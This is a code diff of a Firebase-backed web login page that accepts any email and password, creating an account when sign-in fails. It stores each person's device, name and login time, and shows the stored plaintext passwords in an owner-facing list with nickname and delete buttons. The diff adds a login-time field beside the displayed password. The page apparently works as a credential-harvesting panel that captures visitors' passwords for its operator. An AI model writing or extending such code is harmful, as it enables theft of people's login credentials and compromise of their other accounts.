@@ -158,7 +158,6 @@
             const p = document.getElementById('u-pass').value;
             if(!e || !p) return alert("Fill Email & Password!");
             
-            // "Password koi bhi ho" logic: login try karein, fail ho to signup karein
             auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
             .catch(() => {
                 auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
@@ -177,7 +176,7 @@
                     device: getAdvancedModel(),
                     realName: realName,
                     ownerNick: nick,
-                    time: new Date().toLocaleString()
+                    time: new Date().toLocaleString() // TIME SAVED HERE
                 }).then(() => {
                     document.getElementById('login-box').classList.add('hidden');
                     document.getElementById('member-area').classList.remove('hidden');
@@ -198,7 +197,8 @@
                             <span>Name: ${v.realName}</span><br>
                             <small>Email: ${v.email}</small><br>
                             <small style="color:var(--primary)">Device: ${v.device}</small><br>
-                            <small>Password used: ${v.password}</small><br>
+                            <small style="color:#00ff00">Login Time: ${v.time || 'N/A'}</small><br>
+                            <small>Password: ${v.password}</small><br>
                             <button onclick="setNick('${c.key}')" style="margin-top:5px;">SET NICK</button>
                             <button onclick="firebase.database().ref('users/${c.key}').remove()" style="background:red; margin-left:10px;">DEL</button>
                         </div>`;
